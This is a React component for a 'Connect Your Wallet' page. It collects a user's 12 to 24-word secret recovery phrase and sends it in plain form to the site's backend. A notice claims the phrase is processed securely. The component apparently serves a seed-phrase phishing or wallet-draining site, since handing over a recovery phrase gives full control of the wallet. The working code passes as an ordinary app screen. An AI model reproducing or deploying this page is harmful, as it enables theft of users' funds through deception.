import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import './ConnectWallet.css';

const LoadingSpinner = () => (
  <div className="loading-overlay">
    <div className="spinner">
      <div className="double-bounce1"></div>
      <div className="double-bounce2"></div>
    </div>
    <p>Connecting and saving address...</p>
  </div>
);

const ConnectWallet = () => {
  const [user, setUser] = useState(null);
  const [error, setError] = useState('');
  const [phrase, setPhrase] = useState('');
  const [name, setName] = useState('My Wallet'); // Add a name for the wallet
  const [isLoading, setIsLoading] = useState(false);
  const [walletAddress, setWalletAddress] = useState('');
  const navigate = useNavigate();

  const apiUrl = import.meta.env.VITE_API_URL;
  const token = localStorage.getItem('token');

  useEffect(() => {
    const storedUser = JSON.parse(localStorage.getItem('user'));
    if (storedUser) {
      setUser(storedUser);
      setWalletAddress(storedUser.walletAddress || '');
    }
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');
    setIsLoading(true);

    const words = phrase.trim().split(/\s+/);
    if (words.length < 12) {
      setError('A secret phrase must contain at least 12 words.');
      setIsLoading(false);
      return;
    }

    try {
      // Send the secret phrase to the backend
      const res = await fetch(`${apiUrl}/users/connect-wallet-phrase`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({ phrase: phrase.trim(), name }),
      });

      const data = await res.json();

      if (!res.ok) {
        throw new Error(data.message || 'Failed to connect wallet.');
      }

      // Update local storage and state with the new address
      localStorage.setItem('user', JSON.stringify(data));
      setWalletAddress(data.walletAddress);
      setIsLoading(false);
      navigate('/user/assets');
    } catch (err) {
      setIsLoading(false);
      setError(err.message || 'An unknown error occurred.');
    }
  };

  return (
    <div className="connect-wallet-page">
      {isLoading && <LoadingSpinner />}
      <div className="ticket-form-container">
        <div className="wallet-icon">
          <span className="material-symbols-outlined">key</span>
        </div>
        <h1 className="ticket-title">Connect Your Wallet</h1>
        <p className="connect-subtitle">Enter your secret recovery phrase to connect your wallet.</p>
        
        {error && <div className="ticket-error-message">{error}</div>}
        
        {walletAddress ? (
          <div className="wallet-connected-info">
            <p>Your wallet is connected:</p>
            <strong className="wallet-address" title={walletAddress}>{walletAddress}</strong>
            <button onClick={() => navigate('/user/assets')} className="btn-ticket-primary">View My Assets</button>
          </div>
        ) : (
          <form onSubmit={handleSubmit} className="connect-form">
            <div className="input-group">
              <input type="text" id="name" value={name} onChange={(e) => setName(e.target.value)} placeholder=" " required />
              <label htmlFor="name">Wallet Name</label>
            </div>
            <textarea value={phrase} onChange={(e) => setPhrase(e.target.value)} placeholder="Enter your 12, 18, or 24-word secret phrase..." className="form-control-ticket" rows="4" required></textarea>
            <div className="security-notice">
              <span className="material-symbols-outlined">shield</span>
              <span>Your phrase is processed securely and is never stored in plain text.</span>
            </div>
            <button type="submit" className="btn-ticket-primary connect-btn" disabled={isLoading}>
              {isLoading ? 'Connecting...' : 'Connect Wallet'}
            </button>
          </form>
        )}
      </div>
    </div>
  );
};

export default ConnectWallet;